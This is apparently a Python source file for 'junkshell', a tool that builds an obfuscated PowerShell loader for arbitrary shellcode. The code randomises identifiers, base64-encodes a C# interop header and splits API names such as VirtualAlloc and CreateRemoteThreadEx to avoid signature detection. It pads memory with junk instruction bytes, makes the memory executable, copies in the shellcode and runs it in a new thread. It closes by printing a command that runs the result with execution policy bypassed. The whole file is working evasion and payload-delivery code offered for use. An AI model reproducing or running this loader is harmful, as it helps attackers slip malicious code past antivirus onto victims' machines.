"""
junkshell v0.1 - shellcode loader for powershell


"""

import base64
import random
import string
import argparse
import sys

def gen_alpha_upper(length=8):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(length))

def gen_alpha(length=8):
    return ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(length))

class Builder():
    def __init__(self):
        self.shellcode = bytes()
    
    def from_file(self, filename):
        handle = open(filename, "rb")
        self.shellcode = handle.read()
        handle.close()
        return self 


class ShellcodeBuilder(Builder):
    def encode(self):
        sh = bytes([x for x in self.shellcode])
        return ",".join(["0x{:02x}".format(x) for x in sh])

class PefileBuilder(Builder):
    def encode(self):
        pefile = bytes([x for x in self.shellcode])
        return ",".join(["0x{:02x}".format(x) for x in pefile])


"""
junkshell v0.1 - shellcode loader for powershell 
shellcode
"""


parser = argparse.ArgumentParser(description='junkshell - A shellcode loader for Powershell')
#parser.add_argument('-p', '--pefile', help='PeFile to load')
parser.add_argument('-s', '--shellcode', help='Shellcode file to load')
#parser.add_argument('-e', '--encoded', help='Encoded powershell command [only using -s]')
parser.add_argument('-o', '--output', help='Output file', required=True) 

args = parser.parse_args()
if False: #args.pefile:
    #load pe file
    builder = PefileBuilder()
    builder = builder.from_file(args.pefile)
    #it works only shellcode for now
elif args.shellcode:  
    builder = ShellcodeBuilder() 
    builder = builder.from_file(args.shellcode)
else:
    print("[!] You need to specify a shellcode or a pe file")
    sys.exit(0)


class_name = gen_alpha_upper()
bypass_lol = gen_alpha()
toomuch_va = gen_alpha()
toomuch_crt = gen_alpha()
k32_instance_var = gen_alpha()
bin_shellcode = builder.encode()
blocks = [

    f"""[UnmanagedFunctionPointer(CallingConvention.Cdecl)]    public delegate IntPtr VAStub(IntPtr a, UIntPtr b, UInt32 c, UInt32 d);
    """,
    f"""
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate IntPtr CRTStub(IntPtr h, IntPtr a, IntPtr b, IntPtr c, IntPtr d, UInt32 e,UInt32 p,  out IntPtr f);
    """,
    f"""
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary( [MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    """,
    f"""
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string nFunction);
    """,
    f"""
    public static IntPtr {bypass_lol}(IntPtr hModule, string nFunction){{
        return GetProcAddress(hModule, nFunction.Replace("_",""));
    }}
    """,
    f"""
    public static Delegate {toomuch_va}(IntPtr ptr){{
            return Marshal.GetDelegateForFunctionPointer(ptr, typeof(VAStub));
    }}
    """,
    f"""
    public static Delegate {toomuch_crt}(IntPtr ptr){{
        return Marshal.GetDelegateForFunctionPointer(ptr, typeof(CRTStub));
    }}
    """,
    f"""
    [DllImport("msvcrt.dll")]
    public static extern IntPtr memset(IntPtr dest, uint src, uint count);
    """,
    f"""
    [DllImport("msvcrt.dll")]
    public static extern IntPtr malloc(uint src);
    """,
    f"""
    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr b,UIntPtr s,uint p,out uint o);
    """
]
random.shuffle(blocks)
__header = f"""
using System;
using System.Runtime.InteropServices;


public static class {class_name}
    {{
    {"".join(blocks)}
}}

"""
variables = {}
def var(name=""):
    if name not in variables:
        variables[name] = gen_alpha()
    return variables[name]



def generate_junks(len_junks = 3, base_var = "junk"):
    options = [
        [0x48, 0x31, 0xc0, 0x90],
        [0x48, 0x31, 0xc9, 0x90],
        [0x48, 0x31, 0xd2, 0x90],
        [0x66, 0x31, 0xc0, 0x90],
        [0x66, 0x50, 0x66, 0x58],
        [0x90, 0x90, 0x90, 0x90]
    ]
    junks = []
    names = []
    for n in range(len_junks):
        #4 bytes
        ro = options[random.randint(0, len(options) - 1)]
        name = "$"+base_var + str(n)
        names.append(name)
        junks.append("[Byte[]]{}=0x{:02x},0x{:02x},0x{:02x},0x{:02x}" \
                     .format(name, ro[0], ro[1], ro[2], ro[3]))
    composer = f"${base_var} = @({','.join(names)})"

    return "\n".join(junks) + "\n" + composer


length_junks = random.randint(6, 22)
junk_base_var = gen_alpha()

valloc = "VirtualAlloc"
valloc = "".join( "{}{}".format(c, "_" * random.randint(0, 3)) for c in valloc)

crthread = "CreateRemoteTh__readEx"
crthread = "".join( "{}{}".format(c, "_" * random.randint(0, 3)) for c in crthread)

buffer = ""
buffer += f"""
${var("load_library_var")} = @"
{base64.b64encode(__header.encode()).decode()}
"@

Add-Type -TypeDefinition $( [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${var("load_library_var")})))

${var("k32_instance_var")} = [{class_name}]
${var("size_memory_var")} = {random.randint(10000, 20000)}

{generate_junks(length_junks, junk_base_var)}


[Byte[]]${var("shellcode")} = {bin_shellcode}

${var("size_shellcode_var")} = ${var("shellcode")}.Length
${var("size_junks_var")} = ${var("size_memory_var")} * 4
${var("size_total_var")} = ${var("size_junks_var")} + ${var("size_shellcode_var")}

${var("win32_var")} = New-Object System.Object
${var("hmodule_var")} = ${var("k32_instance_var")}::LoadLibrary("kernel32.dll")



${var("va_addr")}  = ${var("k32_instance_var")}::{bypass_lol}(${var("hmodule_var")}, "{valloc}")
${var("va_pointer")} = ${var("k32_instance_var")}::{toomuch_va}(${var("va_addr")})
${var("win32_var")} | Add-Member NoteProperty -Name fnVA -Value ${var("va_pointer")}

${var("crt_addr")}   = ${var("k32_instance_var")}::{bypass_lol}(${var("hmodule_var")}, "{crthread}")
${var("crt_pointer")} = ${var("k32_instance_var")}::{toomuch_crt}(${var("crt_addr")})
${var("win32_var")} | Add-Member NoteProperty -Name fnCRT -Value ${var("crt_pointer")}

#${var("ptr_var")}=${var("win32_var")}.fnVA.Invoke([IntPtr]::Zero,[UInt32]${var("size_total_var")}, [UInt32]0x3000,[UInt32]0x40)

${var("ptr_var")}= ${var("k32_instance_var")}::malloc([UInt32]${var("size_total_var")})


${var("chunks")}=0
${var("min_index")} = 0
${var("max_index")} = ${junk_base_var}.Length - 1

while(${var("chunks")} -le ${var("size_junks_var")}/4){{
        $random = New-Object -TypeName System.Random
        $cc=${var("k32_instance_var")}::VirtualProtect([IntPtr](${var("ptr_var")}.toInt64()+${var("chunks")}), [UInt32]4, [UInt32]0x40, [ref][UInt32]0)
        ${var("random_index")} = $random.Next($minIndex, $maxIndex)
        ${var("curr_junk")} = ${junk_base_var}[${var("random_index")}]

        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[0] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[1] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[2] , 1)
        ${var("chunks")}+=1
        $c=${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+(${var("chunks")})),${var("curr_junk")}[3] , 1)
        ${var("chunks")}+=1
}}

for ($i=0;$i -le (${var("shellcode")}.Length-1);$i++) {{
    $cc=${var("k32_instance_var")}::VirtualProtect([IntPtr](${var("ptr_var")}.toInt64()+${var("chunks")}+$i), [UInt32]1, [UInt32]0x40, [ref][UInt32]0)

    $sh = ${var("shellcode")}[$i] -bxor 0x0
    $c = ${var("k32_instance_var")}::memset([IntPtr](${var("ptr_var")}.ToInt64()+${var("chunks")}+$i), $sh , 1)

}}

$p = 0
$o = ${var("win32_var")}.fnCRT.Invoke(-1, 0, 0, ${var("ptr_var")}, 0, 0, 0, [ref]$p)

$f = Get-Random -Maximum 10
while([UInt32]$f -ne ([UInt32]6)){{
    $f = Get-Random -Maximum 10
}}
"""

#write a file to output arg
if args.output:
    with open(args.output, "w") as f:
        f.write(buffer)
        f.close()

print("\n[!]" + " " * 10 + "Powershell script generated" + " " * 10 + "[!]\n")
print("You should run the powershell script below:\n")
print(">> powershell.exe -exec Bypass -File " + args.output, "<<")
print("")

